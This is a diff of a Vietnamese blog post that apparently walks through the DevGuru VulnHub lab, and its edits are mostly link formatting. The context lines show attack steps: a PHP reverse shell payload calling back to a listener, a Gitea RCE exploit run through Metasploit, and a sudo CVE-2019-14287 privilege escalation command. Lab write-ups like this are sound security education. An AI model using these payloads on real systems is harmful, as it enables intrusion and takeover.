@@ -9,15 +9,13 @@ tags:
 pin: true
 ---
 
-Download [Devguru VulnHub](https://www.vulnhub.com/entry/devguru-1,620/)
+Download [Devguru VulnHub](https://www.vulnhub.com/entry/devguru-1,620/){:target="\_blank"}.
 
 **Level**: Intermediate (Depends on experience)
 
 ## Information Gathering
 
 ### Arp-scan
-
-Tìm IP của target machine trước rồi làm gì thì làm.
 
 ```shell
 $ sudo arp-scan -l
@@ -180,11 +178,11 @@ Check qua thì thấy `/backend` là 1 trang admin october cms. Hệ thống nà
 ...
 ```
 
-Vậy thì `.git` là gì?... Đại khái Git là một phần mềm giúp quản lý mã nguồn, phát triển dự án một cách dễ dàng hơn. Mọi thông tin của mã nguồn như: lịch sử thay đổi, các phiên bản sau mỗi lần commit, các đoạn mã và tác giả được lưu lại theo cấu trúc dữ liệu phân tán nằm trong thư mục “.git/" của dự án. Khi phiên bản mới gặp lỗi, nhà phát triển có thể sử dụng phiên bản trước đó được lưu trong git để rollback coi như chưa có từng cuộc chia ly. Đây thực sự là lợi ích to lớn của Git, nhưng cái gì cũng có 2 mặt, `.git` sẽ thực sự nguy hiểm nếu lập trình viên và quản trị hệ thống "quên" không xóa nó trong mã nguồn.
+Vậy thì `.git` là gì?... Đại khái Git là một phần mềm giúp quản lý mã nguồn, phát triển dự án một cách dễ dàng hơn. Mọi thông tin của mã nguồn như: lịch sử thay đổi, các phiên bản sau mỗi lần commit, các đoạn mã và tác giả được lưu lại theo cấu trúc dữ liệu phân tán nằm trong thư mục “.git/" của dự án. Khi phiên bản mới gặp lỗi, nhà phát triển có thể sử dụng phiên bản trước đó được lưu trong git để rollback coi như chưa từng có cuộc chia ly. Đây thực sự là lợi ích to lớn của Git, nhưng cái gì cũng có 2 mặt, `.git` sẽ thực sự nguy hiểm nếu lập trình viên và quản trị hệ thống "quên" không xóa nó trong mã nguồn.
 
 ### GitHack
 
-Quay trở lại với lab, đã biết sự tồn tại của .git rồi, giờ làm thế nào để dump toàn bộ mã nguồn từ nó đây? Ở đây tôi sử dụng tools [GitHack](https://github.com/lijiejie/GitHack).
+Quay trở lại với lab, đã biết sự tồn tại của .git rồi, giờ làm thế nào để dump toàn bộ mã nguồn từ nó đây? Ở đây tôi sử dụng tools [GitHack](https://github.com/lijiejie/GitHack){:target="\_blank"}.
 
 ![GitHack](/posts/devguru/githack.PNG)
 
@@ -312,7 +310,7 @@ function onStart() {
 
 ![poc](/posts/devguru/poc.PNG)
 
-Vậy là đã test RCE thành công, ta có thể chạy lệnh bất kì tại đây. Tạo payload reverse shell rồi chạy thôi, ở đây mình dùng PHP proc_open payload được generate từ [revshell.com](https://www.revshells.com/).
+Vậy là đã test RCE thành công, ta có thể chạy lệnh bất kì tại đây. Tạo payload reverse shell rồi chạy thôi, ở đây mình dùng PHP proc_open payload được generate từ [revshell.com](https://www.revshells.com/){:target="\_blank"}.
 
 ```php
 $sock=fsockopen("10.0.2.15",9005);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
@@ -340,7 +338,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### Privilege Escalation (other user)
 
-[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS){:target="\_blank"}
 
 LinPEAS là 1 script đắc lực dùng để scan toàn bộ hệ thống, tìm kiếm các đường dẫn khả thi để leo thang đặc quyển trên Linux/Unix, MacOS.
 
@@ -396,7 +394,7 @@ Ném vào login vô gitea cổng 8585
 
 ![gitea home](/posts/devguru/gitea-home.PNG)
 
-Gitea v1.12.5 có chứa 1 lỗ hổng dẫn tới RCE, có mã [CVE-2020-14144](https://www.cvedetails.com/cve/CVE-2020-14144/). Nếu khai thác lỗi này thành công, ta có thể lấy được shell của thằng frank chạy trong hệ thống.
+Gitea v1.12.5 có chứa 1 lỗ hổng dẫn tới RCE, có mã [CVE-2020-14144](https://www.cvedetails.com/cve/CVE-2020-14144/){:target="\_blank"}. Nếu khai thác lỗi này thành công, ta có thể lấy được shell của thằng frank chạy trong hệ thống.
 
 ```shell
 msf6 > search gitea
@@ -507,7 +505,7 @@ Sudoers I/O plugin version 1.8.21p2
 
 ```
 
-Thật không may cho Devguru, với phiên bản của sudo v1.8.28, có mã [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287), cho phép kẻ tấn công có thể chạy dưới ALL sudoer nhưng bypass blacklists, bỏ qua cấu hình !root ở trên bằng cách sudo với craft user id `\#$((0xffffffff))`.
+Thật không may cho Devguru, với phiên bản của sudo v1.8.28, có mã [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287){:target="\_blank"}, cho phép kẻ tấn công có thể chạy dưới ALL sudoer nhưng bypass blacklists, bỏ qua cấu hình !root ở trên bằng cách sudo với craft user id `\#$((0xffffffff))`.
 
 ```shell
 frank@devguru:/home/frank$ sudo -u#$((0xffffffff)) sqlite3 /dev/null '.shell /bin/bash'
